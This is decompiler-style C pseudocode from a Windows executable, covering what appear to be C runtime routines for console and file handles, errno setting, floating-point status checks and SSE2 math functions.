// Address range: 0x40f3e5 - 0x40f3e6
int32_t function_40f3e5(void) {
    // 0x40f3e5
    int32_t result; // 0x40f3e5
    return result;
}

// Address range: 0x40f3e7 - 0x40f3f8
int32_t function_40f3e7(void) {
    // 0x40f3e7
    __asm_fnclex();
    int32_t v1; // 0x40f3e7
    return 0x10000 * v1 / 0x10000;
}

// Address range: 0x40f3f8 - 0x40f3f9
int32_t function_40f3f8(void) {
    // 0x40f3f8
    int32_t result; // 0x40f3f8
    return result;
}

// Address range: 0x40f3fa - 0x40f424
int32_t function_40f3fa(int32_t a1, int32_t a2) {
    // 0x40f3fa
    __asm_wait();
    int32_t v1; // 0x40f3fa
    return 0x10000 * v1 / 0x10000;
}

// Address range: 0x40f424 - 0x40f425
int32_t function_40f424(void) {
    // 0x40f424
    int32_t result; // 0x40f424
    return result;
}

// Address range: 0x40f426 - 0x40f47f
int32_t function_40f426(int32_t a1) {
    // 0x40f426
    int32_t v1; // 0x40f426
    if ((a1 & 1) != 0) {
        // 0x40f434
        v1 = __asm_wait();
    }
    int32_t v2 = v1; // 0x40f441
    if ((a1 & 8) != 0) {
        // 0x40f443
        __asm_wait();
        __asm_wait();
        int32_t v3; // 0x40f426
        v2 = __asm_wait() & -0x10000 | v3 & 0xffff;
    }
    int32_t v4 = v2; // 0x40f456
    if ((a1 & 16) != 0) {
        // 0x40f458
        v4 = __asm_wait();
    }
    int32_t v5 = v4; // 0x40f465
    if ((a1 & 4) != 0) {
        // 0x40f467
        v5 = __asm_wait();
    }
    int32_t result = v5; // 0x40f473
    if ((a1 & 32) != 0) {
        // 0x40f475
        result = __asm_wait();
    }
    // 0x40f47b
    return result;
}

// Address range: 0x40f47f - 0x40f480
int32_t function_40f47f(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    // 0x40f47f
    int32_t result; // 0x40f47f
    return result;
}

// Address range: 0x40f481 - 0x40f491
int32_t function_40f481(void) {
    // 0x40f481
    __asm_wait();
    int32_t v1; // 0x40f481
    return 0x10000 * v1 / 0x10000;
}

// Address range: 0x40f491 - 0x40f4b0
int32_t function_40f491(int32_t a1, int32_t a2) {
    int32_t result = (int32_t)CreateFileW(L"CONOUT$", 0x40000000, 3, NULL, 3, 0, NULL); // 0x40f4a4
    g141 = result;
    return result;
}

// Address range: 0x40f4b0 - 0x40f4c7
int32_t function_40f4b0(void) {
    int32_t handleClosed = g141; // 0x40f4b8
    if (g141 <= 0xfffffffd) {
        // 0x40f4bf
        handleClosed = CloseHandle((int32_t *)g141);
    }
    // 0x40f4c6
    return handleClosed;
}

// Address range: 0x40f4c7 - 0x40f53d
int32_t function_40f4c7(int32_t a1) {
    // 0x40f4c7
    if (a1 == 0) {
        // 0x40f4d4
        *(int32_t *)function_40ab11() = 22;
        // 0x40f53a
        return -1;
    }
    // 0x40f4e9
    if ((*(int32_t *)(a1 + 12) & 0x2000) == 0) {
        // 0x40f530
        function_40fa12(a1);
        // 0x40f53a
        return -1;
    }
    // 0x40f4f7
    int32_t v1; // 0x40f4c7
    int32_t v2; // 0x40f4c7
    int32_t result = function_40b50d(a1, v1, v2); // 0x40f4f8
    function_40e7a5(a1);
    int32_t v3 = function_40b3ab(a1); // 0x40f506
    if (function_40f8f7(v3) < 0) {
        // 0x40f530
        function_40fa12(a1);
        // 0x40f53a
        return -1;
    }
    int32_t * v4 = (int32_t *)(a1 + 28); // 0x40f51d
    int32_t v5 = *v4; // 0x40f51d
    if (v5 != 0) {
        // 0x40f523
        function_40bbdc(v5);
        *v4 = 0;
    }
    // 0x40f530
    function_40fa12(a1);
    // 0x40f53a
    return result;
}

// Address range: 0x40f53d - 0x40f5b0
int32_t function_40f53d(void) {
    // 0x40f53d
    function_406770(&g109, 16, (int32_t)&g266);
    int32_t v1; // 0x40f53d
    int32_t v2 = *(int32_t *)(v1 + 8); // 0x40f549
    *(int32_t *)(v1 - 32) = v2;
    int32_t result; // 0x40f5aa
    if (v2 == 0) {
        // 0x40f55a
        *(int32_t *)function_40ab11() = 22;
        // 0x40f5aa
        result = function_4067b6((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
        return result;
    }
    // 0x40f56f
    if ((*(int32_t *)(v2 + 12) & 0x1000) == 0) {
        int32_t * v3 = (int32_t *)(v1 - 28); // 0x40f582
        *v3 = 0;
        function_40b4e5(v2);
        int32_t * v4 = (int32_t *)(v1 - 4); // 0x40f58c
        *v4 = 0;
        *v3 = function_40f4c7(v2);
        *v4 = -2;
        function_40f5b3();
    } else {
        // 0x40f57a
        function_40fa12(v2);
    }
    // 0x40f5aa
    result = function_4067b6((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
    return result;
}

// Address range: 0x40f5b3 - 0x40f5bd
int32_t function_40f5b3(void) {
    // 0x40f5b3
    int32_t v1; // 0x40f5b3
    return function_40b4f9(*(int32_t *)(v1 - 32));
}

// Address range: 0x40f5bd - 0x40f5d9
int32_t function_40f5bd(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8) {
    // 0x40f5bd
    if (*(char *)a1 == 0) {
        // 0x40f5d7
        return 0;
    }
    int32_t v1 = 0; // 0x40f5c9
    int32_t result = a2; // 0x40f5ce
    while (v1 != a2) {
        // 0x40f5d0
        v1++;
        result = v1;
        if (*(char *)(v1 + a1) == 0) {
            // break -> 0x40f5d7
            break;
        }
        result = a2;
    }
    // 0x40f5d7
    return result;
}

// Address range: 0x40f5e0 - 0x40f730
int32_t function_40f5e0(int32_t a1, int32_t a2, int32_t a3) {
    bool v1 = true; // 0x40f5e7
    if (g259 != 0) {
        // 0x40f5ed
        int16_t v2; // 0x40f5e0
        __asm_stmxcsr((int32_t)v2);
        v1 = false;
        int32_t v3; // 0x40f5e0
        if ((v2 & 0x7f80) == 0x1f80 == (v3 & 127) == 127) {
            // 0x40f61a
            return (float32_t)function_40fa78((int32_t)&g266);
        }
    }
    // 0x40f66f
    function_410135();
    int32_t v4 = __asm_wait(); // 0x40f679
    if (v1) {
        if ((v4 & 0xfffff || a2) == 0) {
            if (v4 > -1) {
                goto lab_0x40f6a5;
            } else {
                goto lab_0x40f711;
            }
        } else {
            // 0x40f6ef
            function_41011c();
            goto lab_0x40f711;
        }
    } else {
        if ((a3 & 0x7ff00000) == 0) {
            if (a3 <= -1 || (a3 & 0xfffff || a2) == 0) {
                goto lab_0x40f711;
            } else {
                goto lab_0x40f6a5;
            }
        } else {
            if (a3 <= -1) {
                goto lab_0x40f711;
            } else {
                goto lab_0x40f6a5;
            }
        }
    }
  lab_0x40f6a5:
    // 0x40f6a5
    if (g235 != 0) {
        function_41018e((int32_t)&g266);
    }
    // 0x40f6b2
    return function_41019b((int32_t)&g266);
  lab_0x40f711:
    // 0x40f711
    if (g235 != 0) {
        function_41018e((int32_t)&g266);
    }
    int32_t result = function_410297((int32_t)&g266, (int32_t)&g266, (int32_t)&g266); // 0x40f729
    return result;
}

// Address range: 0x40f730 - 0x40f84d
float80_t function_40f730(int64_t a1) {
    int64_t result = a1;
    if (g259 == 0) {
        function_4104eb((int32_t)&g266, (int32_t)&g266);
    }
    // 0x40f73d
    int32_t v1; // 0x40f730
    __asm_stmxcsr(v1);
    int64_t * v2; // 0x40f730
    if ((v1 & 0x7f80) == 0x1f80 != (((int32_t)v2 & 127) == 127)) {
        function_4104eb((int32_t)&g266, (int32_t)&g266);
    }
    int128_t v3 = __asm_movq(result); // 0x40f770
    int128_t v4 = __asm_movapd(g51); // 0x40f776
    int128_t v5 = __asm_movapd(v3); // 0x40f77e
    int128_t v6 = __asm_movapd(v3); // 0x40f782
    int128_t v7 = __asm_psrlq(v3, 52); // 0x40f786
    int32_t v8 = __asm_movd_7(v7); // 0x40f78b
    int128_t v9 = __asm_psubd(v4, __asm_andpd(v7, g53)); // 0x40f797
    int128_t v10 = __asm_psrlq_12(v5, v9); // 0x40f79b
    char v11; // 0x40f730
    if ((v8 & 2048) == 0) {
        int128_t v12 = __asm_movq(result); // 0x40f7f2
        int128_t v13 = __asm_psllq(v10, v9); // 0x40f7f8
        int128_t v14 = __asm_movapd(v12); // 0x40f7fc
        int128_t v15 = __asm_cmpnlepd(v12, v13); // 0x40f800
        if (v8 < 1023) {
            // 0x40f831
            __asm_movq_3(result, __asm_andpd(__asm_cmpnlepd(v14, g52), g50));
            return result;
        }
        // 0x40f80c
        v11 = llvm_ctpop_i8((char)v8 - 50);
        if (v8 <= 1074) {
            // 0x40f813
            __asm_movq_3(result, __asm_addsd(v13, __asm_andpd(v15, g50)));
            return result;
        }
    } else {
        if (v8 < 3071) {
            // 0x40f82a
            return 0.0L;
        }
        int128_t v16 = __asm_psllq(v10, v9); // 0x40f7ad
        v11 = llvm_ctpop_i8((char)v8 - 50);
        if (v8 <= 3122) {
            // 0x40f7b8
            __asm_movq_3(result, v16);
            return result;
        }
    }
    // 0x40f7c3
    __asm_ucomisd(v6, v6);
    if ((v11 & 1) == 0) {
        // 0x40f7c9
        function_4102d3(&result, &result, &result, 1004);
    }
    // 0x40f7ed
    return result;
}

// Address range: 0x40f84d - 0x40f8c0
int32_t function_40f84d(int32_t * a1, int32_t a2, int32_t * a3, int32_t a4, int32_t a5, int32_t a6) {
    // 0x40f84d
    function_406770(&g110, 12, (int32_t)&g266);
    int32_t v1; // 0x40f84d
    int32_t * v2 = (int32_t *)(v1 - 28); // 0x40f859
    *v2 = 0;
    function_40d8f5(*(int32_t *)*(int32_t *)(v1 + 8));
    int32_t * v3 = (int32_t *)(v1 - 4); // 0x40f868
    *v3 = 0;
    int32_t v4 = *(int32_t *)*(int32_t *)*(int32_t *)(v1 + 12); // 0x40f871
    int32_t v5 = *(int32_t *)(4 * v4 / 64 + (int32_t)&g207); // 0x40f880
    int32_t v6; // 0x40f84d
    if ((*(char *)(v5 + 40 + 48 * (v4 & 63)) & 1) == 0) {
        // 0x40f899
        *(int32_t *)function_40ab11() = 9;
        v6 = -1;
    } else {
        // 0x40f88e
        v6 = function_40f976(v4);
    }
    // 0x40f8a7
    *v2 = v6;
    *v3 = -2;
    function_40f8c3();
    int32_t result = function_4067b6((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266); // 0x40f8b8
    return result;
}

// Address range: 0x40f8c3 - 0x40f8cf
int32_t function_40f8c3(void) {
    // 0x40f8c3
    int32_t v1; // 0x40f8c3
    return function_40d918(*(int32_t *)*(int32_t *)(v1 + 16));
}

// Address range: 0x40f8cf - 0x40f8f7
int32_t function_40f8cf(int32_t a1, int32_t * a2, int32_t a3, int32_t * a4, int32_t a5) {
    int32_t v1 = a1; // bp-12, 0x40f8dd
    int32_t v2 = a1; // bp-16, 0x40f8e0
    int32_t v3; // 0x40f8cf
    return function_40f84d(&v2, (int32_t)a2, &v1, a1, a1, v3);
}

// Address range: 0x40f8f7 - 0x40f976
int32_t function_40f8f7(uint32_t a1) {
    int32_t v1 = a1;
    if (a1 == -2) {
        // 0x40f906
        *(int32_t *)function_40aafe() = 0;
        *(int32_t *)function_40ab11() = 9;
        // 0x40f971
        return -1;
    }
    if (a1 >= 0) {
        // 0x40f91f
        if (g209 > a1) {
            int32_t v2 = *(int32_t *)(4 * a1 / 64 + (int32_t)&g207); // 0x40f934
            if ((*(char *)(48 * (a1 & 63) + 40 + v2) & 1) != 0) {
                int32_t v3 = &v1; // bp-8, 0x40f945
                // 0x40f971
                int32_t v4; // 0x40f8f7
                int32_t v5; // 0x40f8f7
                return function_40f8cf(a1, &v3, v4, &v1, v5);
            }
        }
    }
    // 0x40f956
    *(int32_t *)function_40aafe() = 0;
    *(int32_t *)function_40ab11() = 9;
    // 0x40f971
    return -1;
}

// Address range: 0x40f976 - 0x40fa12
int32_t function_40f976(int32_t a1) {
    int32_t v1 = a1; // bp-16, 0x40f980
    int32_t v2 = function_40d9cc(a1); // 0x40f981
    int32_t v3; // bp-12, 0x40f976
    int32_t v4 = &v3; // 0x40f986
    int32_t v5 = v4; // 0x40f98a
    int32_t errorCode = 0; // 0x40f98a
    if (v2 != -1) {
        // 0x40f990
        if (a1 != 1) {
            goto lab_0x40f9a3;
        } else {
            // 0x40f99a
            if ((*(char *)(g207 + 136) & 1) != 0) {
                goto lab_0x40f9ae;
            } else {
                goto lab_0x40f9a3;
            }
        }
    } else {
        goto lab_0x40f9de;
    }
  lab_0x40f9de:;
    int32_t * v6 = (int32_t *)(v5 - 4); // 0x40f9de
    *v6 = a1;
    function_40d93b((int32_t)&g266);
    int32_t v7 = *(int32_t *)(4 * a1 / 64 + (int32_t)&g207); // 0x40f9f0
    *(char *)(48 * (a1 & 63) + 40 + v7) = 0;
    int32_t result = 0; // 0x40f9fe
    if (errorCode != 0) {
        // 0x40fa00
        *v6 = errorCode;
        function_40aadb();
        result = -1;
    }
    // 0x40fa0e
    return result;
  lab_0x40f9a3:
    if (a1 != 2) {
        goto lab_0x40f9c4;
    } else {
        // 0x40f9a8
        if ((*(char *)(g207 + 88) & 1) == 0) {
            goto lab_0x40f9c4;
        } else {
            goto lab_0x40f9ae;
        }
    }
  lab_0x40f9c4:;
    int32_t hObject = function_40d9cc(a1); // 0x40f9c5
    v1 = hObject;
    int32_t v8 = &v1; // 0x40f9cb
    v5 = v8;
    errorCode = 0;
    if (!CloseHandle((int32_t *)hObject)) {
        // 0x40f9d6
        v5 = v8;
        errorCode = GetLastError();
    }
    goto lab_0x40f9de;
  lab_0x40f9ae:
    // 0x40f9ae
    v1 = 2;
    int32_t v9 = function_40d9cc(2); // 0x40f9b0
    v5 = v4;
    errorCode = 0;
    if (function_40d9cc(1) == v9) {
        goto lab_0x40f9de;
    } else {
        goto lab_0x40f9c4;
    }
}

// Address range: 0x40fa12 - 0x40fa4d
int32_t function_40fa12(int32_t a1) {
    // 0x40fa12
    *(int32_t *)a1 = 0;
    *(int32_t *)(a1 + 4) = 0;
    *(int32_t *)(a1 + 8) = 0;
    *(int32_t *)(a1 + 16) = -1;
    *(int32_t *)(a1 + 20) = 0;
    *(int32_t *)(a1 + 24) = 0;
    *(int32_t *)(a1 + 28) = 0;
    int32_t result = a1 + 12; // 0x40fa46
    *(int32_t *)result = 0;
    return result;
}

// Address range: 0x40fa4d - 0x40fa5c
int32_t function_40fa4d(void) {
    // 0x40fa4d
    g259 = IsProcessorFeaturePresent(10);
    return 0;
}

// Address range: 0x40fa60 - 0x40fa78
int32_t function_40fa60(void) {
    // 0x40fa60
    float80_t v1; // 0x40fa60
    __asm_movq((int64_t)(int32_t)(float32_t)v1);
    int32_t result; // 0x40fa60
    return result;
}

// Address range: 0x40fa78 - 0x40fce4
float80_t function_40fa78(int32_t a1) {
    int32_t v1 = a1;
    int128_t v2; // 0x40fa78
    int128_t v3 = __asm_movlpd_11(v2, (int64_t)a1); // 0x40fa7e
    int32_t v4 = -1023; // 0x40fa7e
    int128_t v5 = v3;
    int128_t v6 = __asm_movapd(v5); // 0x40fa83
    int128_t v7 = __asm_unpcklpd(v5, v5); // 0x40fa87
    int32_t v8 = __asm_pextrw(__asm_psrlq(v6, 52), 0); // 0x40fa90
    int128_t v9 = __asm_movapd(g54); // 0x40fa95
    int128_t v10 = __asm_movapd(g55); // 0x40fa9d
    int128_t v11 = __asm_movapd(g60); // 0x40faa5
    int128_t v12 = __asm_movapd(g56); // 0x40faad
    int128_t v13 = __asm_movapd(g57); // 0x40fab5
    int128_t v14 = __asm_orpd(__asm_andpd(v7, v9), v11); // 0x40fac1
    int32_t v15 = __asm_pextrw(__asm_addpd(v12, v14), 0) & 2032; // 0x40face
    int128_t v16 = __asm_movapd(*(int128_t *)(v15 + (int32_t)&g68)); // 0x40fad3
    int128_t v17 = __asm_movapd(*(int128_t *)(v15 + (int32_t)&g67)); // 0x40fadb
    int128_t v18 = __asm_andpd(v13, v14); // 0x40fae3
    int128_t v19 = __asm_subpd(v14, v18); // 0x40fae7
    int128_t v20 = __asm_subpd(__asm_mulpd(v18, v16), v10); // 0x40faef
    int128_t v21 = __asm_addsd(v17, v20); // 0x40faf3
    int128_t v22 = __asm_mulpd(v19, v16); // 0x40faf7
    int128_t v23 = __asm_movapd(v22); // 0x40fafb
    int128_t v24 = __asm_addpd(v22, v20); // 0x40faff
    int32_t v25 = v8 & 4095; // 0x40fb03
    uint32_t v26 = v25 - 1; // 0x40fb09
    int32_t v27; // 0x40fa78
    int128_t v28; // 0x40fbe4
    int128_t v29; // 0x40fa78
    while (v26 >= 2046) {
        int64_t v30 = v1;
        int128_t v31 = __asm_movlpd_11(v24, v30); // 0x40fbd6
        v28 = __asm_cmpeqsd(__asm_movapd(g61), v31);
        if (__asm_pextrw(v28, 0) != 0) {
            // 0x40fc3b
            __asm_divsd(__asm_movlpd_11(v10, (int64_t)g60), v31);
            v29 = __asm_movlpd_11(v28, -0x10000000000000);
            v27 = 8;
            goto lab_0x40fc8a;
        }
        if (v25 != 0) {
            if (v26 < 2047) {
                int128_t v32 = __asm_movlpd_11(v31, v30); // 0x40fc00
                int128_t v33 = __asm_movapd(g54); // 0x40fc06
                int128_t v34 = __asm_movapd(g60); // 0x40fc0e
                int128_t v35 = __asm_cmpeqsd(v34, __asm_orpd(__asm_andpd(v32, v33), v34)); // 0x40fc1e
                v29 = v33;
                v27 = 1001;
                if (__asm_pextrw(v35, 0) != 0) {
                    // 0x40fc2d
                    return INFINITY;
                }
                goto lab_0x40fc8a;
            } else {
                if ((v8 & 2047) == 2047) {
                    int128_t v36 = __asm_movlpd_11(v10, v30); // 0x40fcb7
                    __asm_movlpd_11(v31, (int64_t)v1);
                    int32_t v37 = __asm_movd_7(v36); // 0x40fcc3
                    int128_t v38 = __asm_psrlq(v36, 32); // 0x40fcc7
                    v29 = v28;
                    v27 = 1001;
                    if ((__asm_movd_7(v38) & 0xfffff || v37) == 0) {
                        goto lab_0x40fc7d;
                    } else {
                        goto lab_0x40fc8a;
                    }
                } else {
                    goto lab_0x40fc7d;
                }
            }
        }
        // 0x40fc56
        v3 = __asm_mulsd(v31, __asm_movlpd_11(v28, 0x4330000000000000));
        v4 = -1075;
        v5 = v3;
        v6 = __asm_movapd(v5);
        v7 = __asm_unpcklpd(v5, v5);
        v8 = __asm_pextrw(__asm_psrlq(v6, 52), 0);
        v9 = __asm_movapd(g54);
        v10 = __asm_movapd(g55);
        v11 = __asm_movapd(g60);
        v12 = __asm_movapd(g56);
        v13 = __asm_movapd(g57);
        v14 = __asm_orpd(__asm_andpd(v7, v9), v11);
        v15 = __asm_pextrw(__asm_addpd(v12, v14), 0) & 2032;
        v16 = __asm_movapd(*(int128_t *)(v15 + (int32_t)&g68));
        v17 = __asm_movapd(*(int128_t *)(v15 + (int32_t)&g67));
        v18 = __asm_andpd(v13, v14);
        v19 = __asm_subpd(v14, v18);
        v20 = __asm_subpd(__asm_mulpd(v18, v16), v10);
        v21 = __asm_addsd(v17, v20);
        v22 = __asm_mulpd(v19, v16);
        v23 = __asm_movapd(v22);
        v24 = __asm_addpd(v22, v20);
        v25 = v8 & 4095;
        v26 = v25 - 1;
    }
    int32_t v39 = v25 + v4; // 0x40fb1e
    int128_t v40 = __asm_cvtsi2sd(v39); // 0x40fb20
    int128_t v41 = __asm_unpcklpd(v40, v40); // 0x40fb24
    int128_t v42 = __asm_movapd(g62); // 0x40fb3d
    int128_t v43 = __asm_movapd(v24); // 0x40fb45
    int128_t v44 = __asm_movapd(g63); // 0x40fb49
    int128_t v45 = __asm_mulpd(v42, v24); // 0x40fb51
    int128_t v46 = __asm_mulpd(v43, v43); // 0x40fb55
    int128_t v47 = __asm_addpd(v45, v44); // 0x40fb59
    int128_t v48 = __asm_movapd(g64); // 0x40fb5d
    int128_t v49 = __asm_mulsd(v46, v46); // 0x40fb65
    int128_t v50 = __asm_mulpd(v41, __asm_movapd(g58)); // 0x40fb71
    int32_t v51 = v15 == -((1024 * v39)) ? (int32_t)&g59 + 16 : (int32_t)&g59; // 0x40fb75
    int128_t v52 = __asm_addpd(__asm_addpd(v21, v50), __asm_andpd(v23, __asm_movapd(*(int128_t *)v51))); // 0x40fb85
    int128_t v53 = __asm_mulpd(v47, v24); // 0x40fb89
    int128_t v54 = __asm_mulsd(v49, v24); // 0x40fb8d
    int128_t v55 = __asm_addpd(v53, v48); // 0x40fb91
    int128_t v56 = __asm_mulpd(__asm_movapd(g65), v24); // 0x40fb9d
    int128_t v57 = __asm_movapd(v52); // 0x40fba1
    int128_t v58 = __asm_unpckhpd(v57, v57); // 0x40fba5
    int128_t v59 = __asm_mulpd(v55, v54); // 0x40fba9
    int128_t v60 = __asm_movapd(v59); // 0x40fbb0
    int128_t v61 = __asm_addsd(__asm_addsd(__asm_unpckhpd(v60, v60), __asm_addpd(v59, v56)), v58); // 0x40fbc0
    float64_t result; // bp-12, 0x40fa78
    __asm_movlpd((int64_t)result, __asm_addsd(v61, v52));
    return result;
  lab_0x40fc8a:
    // 0x40fc8a
    __asm_movlpd((int64_t)result, v29);
    function_4102d3((int64_t *)&v1, (int64_t *)&v1, (int64_t *)&result, v27);
    return result;
  lab_0x40fc7d:;
    int128_t v62 = __asm_xorpd(v28, v28); // 0x40fc7d
    v29 = __asm_divsd(v62, v62);
    v27 = 9;
    goto lab_0x40fc8a;
}

// Address range: 0x40fceb - 0x40fd58
int32_t function_40fceb(void) {
    // 0x40fceb
    int32_t v1; // 0x40fceb
    *(char *)(v1 - 144) = -2;
    int32_t v2; // 0x40fceb
    if ((v2 & 0xff00) == 0) {
        // 0x40fd0e
        function_40fe3e();
        return (float32_t)function_40ffe8();
    }
    // 0x40fd36
    if (function_40fe81() == 0) {
        // 0x40fd53
        return function_4100a3();
    }
    // 0x40fd0e
    function_40fe3e();
    return (float32_t)function_40ffe8();
}

// Address range: 0x40fd58 - 0x40fd6a
float80_t function_40fd58(void) {
    // 0x40fd58
    int32_t v1; // 0x40fd58
    *(char *)(v1 - 144) = 2;
    return INFINITY;
}

// Address range: 0x40fd6a - 0x40fd84
float80_t function_40fd6a(void) {
    // 0x40fd6a
    __asm_wait();
    __asm_wait();
    return 0.693147180559945286227L * llvm_log2_f80(0.693147180559945286227L);
}

// Address range: 0x40fd84 - 0x40fd94
float80_t function_40fd84(void) {
    // 0x40fd84
    int32_t v1; // 0x40fd84
    *(char *)(v1 - 144) = 2;
    return -INFINITY;
}

// Address range: 0x40fd94 - 0x40fdf0
int32_t function_40fd94(void) {
    // 0x40fd94
    int32_t result; // 0x40fd94
    return result;
}

// Address range: 0x40fdf0 - 0x40fe1f
int32_t function_40fdf0(int32_t a1) {
    // 0x40fdf0
    __asm_wait();
    int32_t result = __asm_wait(); // 0x40fdfa
    int32_t v1; // 0x40fdf0
    if ((*(char *)(v1 - 159) & 1) == 0) {
        // 0x40fe04
        return result;
    }
    // 0x40fe13
    *(char *)(v1 - 144) = 4;
    return (float32_t)function_40fff6();
}

// Address range: 0x40fe1f - 0x40fe31
float80_t function_40fe1f(void) {
    // 0x40fe1f
    int32_t v1; // 0x40fe1f
    *(char *)(v1 - 144) = 3;
    return INFINITY;
}

// Address range: 0x40fe31 - 0x40fe3e
float80_t function_40fe31(void) {
    // 0x40fe31
    return INFINITY;
}

// Address range: 0x40fe3e - 0x40fe81
float80_t function_40fe3e(void) {
    // 0x40fe3e
    __asm_wait();
    __asm_wait();
    int32_t v1; // 0x40fe3e
    if ((*(char *)(v1 - 159) & 65) != 0) {
        function_40fdf0((int32_t)&g266);
    }
    // 0x40fe5b
    float80_t v2; // 0x40fe3e
    llvm_round_f80(fabsl(v2));
    __asm_wait();
    __asm_wait();
    __asm_wait();
    return llvm_exp2_f80(fabsl(0.0) - 1.0L);
}

// Address range: 0x40fe81 - 0x40feb5
int32_t function_40fe81(void) {
    // 0x40fe81
    __asm_wait();
    int32_t v1; // 0x40fe81
    int32_t v2 = v1 & 0x4000;
    int32_t result = 0; // 0x40fe8b
    if (v2 != 0) {
        // 0x40fe8d
        __asm_wait();
        result = v2 == 0 ? 1 : 2;
    }
    // 0x40fea6
    return result;
}

// Address range: 0x40feb5 - 0x40fee7
int32_t function_40feb5(void) {
    // 0x40feb5
    __asm_wait();
    int864_t v1 = __asm_fnsave(); // 0x40fec9
    int32_t result = function_41067b(v1, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266); // 0x40fecc
    __asm_frstor(v1);
    return result;
}

// Address range: 0x40fef0 - 0x40ff57
int32_t function_40fef0(void) {
    int16_t v1 = 0x133f; // 0x40fef4
    int32_t v2; // 0x40fef0
    int32_t v3; // 0x40fef0
    if (*(char *)(v3 + 14) == 5) {
        // 0x40fef6
        v1 = *(int16_t *)(v2 - 164) & -1024 | 575;
    }
    // 0x40ff0b
    *(int16_t *)(v2 - 162) = v1;
    float80_t v4; // 0x40fef0
    int32_t v5 = __asm_fxam(v4); // 0x40ff1d
    __asm_wait();
    *(int32_t *)(v2 - 160) = v5;
    *(char *)(v2 - 144) = 0;
    __asm_wait();
    unsigned char v6 = *(char *)(v2 - 159); // 0x40ff34
    char result = *(char *)((int32_t)(v6 / 64 & 1 | 2 * v6 & 14) + (int32_t)&g66); // 0x40ff44
    return result;
}

// Address range: 0x40ff57 - 0x40ffe3
int32_t function_40ff57(void) {
    int16_t v1 = 0x133f; // 0x40ff5b
    int32_t v2; // 0x40ff57
    int32_t v3; // 0x40ff57
    if (*(char *)(v3 + 14) == 5) {
        // 0x40ff5d
        v1 = *(int16_t *)(v2 - 164) & -1024 | 575;
    }
    // 0x40ff72
    *(int16_t *)(v2 - 162) = v1;
    float80_t v4; // 0x40ff57
    int32_t v5 = __asm_fxam(v4); // 0x40ff84
    __asm_wait();
    int32_t * v6 = (int32_t *)(v2 - 160); // 0x40ff8d
    *v6 = v5;
    *(char *)(v2 - 144) = 0;
    char * v7 = (char *)(v2 - 159); // 0x40ff9c
    unsigned char v8 = *v7; // 0x40ff9c
    int32_t v9 = __asm_fxam(v4); // 0x40ffa2
    __asm_wait();
    *v6 = v9;
    unsigned char v10 = *v7; // 0x40ffad
    char v11 = *(char *)((int32_t)(v10 / 64 & 1 | 2 * v10 & 14) + (int32_t)&g66); // 0x40ffbd
    char v12 = *(char *)((int32_t)(v8 / 64 & 1 | 2 * v8 & 14) + (int32_t)&g66); // 0x40ffca
    return v12 | 4 * v11;
}

// Address range: 0x40ffe8 - 0x40ffed
float80_t function_40ffe8(void) {
    // 0x40ffe8
    float80_t result; // 0x40ffe8
    return result;
}

// Address range: 0x40ffed - 0x40fff4
int32_t function_40ffed(void) {
    // 0x40ffed
    int32_t result; // 0x40ffed
    return result;
}

// Address range: 0x40fff6 - 0x40fffb
float80_t function_40fff6(void) {
    // 0x40fff6
    return 0.0L;
}

// Address range: 0x40fffb - 0x410008
int32_t function_40fffb(void) {
    // 0x40fffb
    int32_t result; // 0x40fffb
    return result;
}

// Address range: 0x410008 - 0x41000f
float80_t function_410008(void) {
    // 0x410008
    return 1.0L;
}

// Address range: 0x41000f - 0x41003a
float80_t function_41000f(void) {
    // 0x41000f
    int32_t v1; // 0x41000f
    *(char *)(v1 - 144) = 0;
    float80_t result; // 0x41000f
    if ((*(char *)(v1 - 151) & 64) == 0) {
        // 0x41002c
        return result + 1.0L;
    }
    // 0x410024
    return result;
}

// Address range: 0x41003a - 0x410064
float80_t function_41003a(void) {
    // 0x41003a
    int32_t v1; // 0x41003a
    *(char *)(v1 - 144) = 0;
    float80_t v2; // 0x41003a
    return 2 * v2;
}

// Address range: 0x410064 - 0x4100a3
float80_t function_410064(void) {
    // 0x410064
    int32_t v1; // 0x410064
    char * v2 = (char *)(v1 - 151); // 0x410070
    float80_t v3; // 0x410064
    if ((*v2 & 64) == 0 || (*v2 & 64) == 0) {
        // 0x410099
        *(char *)(v1 - 144) = 1;
        // 0x4100a0
        return 2 * v3;
    }
    // 0x410090
    *(char *)(v1 - 144) = 0;
    // 0x4100a0
    return 2 * v3;
}

// Address range: 0x4100a3 - 0x4100c0
int32_t function_4100a3(void) {
    // 0x4100a3
    int32_t v1; // 0x4100a3
    char * v2 = (char *)(v1 - 144); // 0x4100ad
    char v3 = *v2; // 0x4100ad
    if (v3 >= 0 != v3 != 0) {
        // 0x4100b6
        *v2 = 1;
    }
    // 0x4100bd
    int32_t result; // 0x4100a3
    return result;
}

// Address range: 0x4100c0 - 0x4100dd
int32_t function_4100c0(void) {
    // 0x4100c0
    int32_t result; // 0x4100c0
    return result;
}

// Address range: 0x4100dd - 0x4100e4
int32_t function_4100dd(void) {
    // 0x4100dd
    int32_t result; // 0x4100dd
    return result;
}

// Address range: 0x4100f0 - 0x410105
float80_t function_4100f0(void) {
    // 0x4100f0
    float80_t v1; // 0x4100f0
    llvm_round_f80(v1);
    float80_t v2 = llvm_exp2_f80(-1.0L) + 1.0L; // 0x4100fe
    return v2 * llvm_exp2_f80(llvm_round_f80(v2));
}

// Address range: 0x410105 - 0x41011c
int32_t function_410105(int32_t a1) {
    // 0x410105
    int32_t result; // 0x410105
    return result;
}

// Address range: 0x41011c - 0x410135
int32_t function_41011c(void) {
    // 0x41011c
    return 0;
}

// Address range: 0x410135 - 0x410178
int32_t function_410135(void) {
    // 0x410135
    int32_t v1; // 0x410135
    int32_t v2 = *(int32_t *)(v1 + 4); // 0x410135
    int32_t v3 = v2 & 0x7ff00000; // 0x410138
    return v3 == 0x7ff00000 ? v2 : v3;
}

// Address range: 0x410178 - 0x41018e
int32_t function_410178(float80_t a1) {
    int32_t v1 = (int32_t)(float32_t)a1 & 0x7ff00000; // 0x41017c
    return v1 == 0x7ff00000 ? (int32_t)(float32_t)a1 : v1;
}

// Address range: 0x41018e - 0x41019b
int32_t function_41018e(int32_t a1) {
    // 0x41018e
    int32_t result; // 0x41018e
    return result;
}

